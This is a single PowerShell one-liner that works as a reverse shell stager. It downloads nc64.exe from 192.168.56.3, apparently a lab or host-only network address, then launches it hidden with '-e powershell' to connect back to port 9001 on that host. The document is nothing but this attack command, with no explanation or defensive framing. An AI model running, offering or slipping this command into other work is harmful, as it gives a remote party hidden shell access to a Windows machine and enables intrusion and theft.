(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/nc64.exe', "$env:USERPROFILE\nc64.exe"); Start-Process "$env:USERPROFILE\nc64.exe" -ArgumentList @('192.168.56.3', '9001', '-e', 'powershell') -WindowStyle Hidden
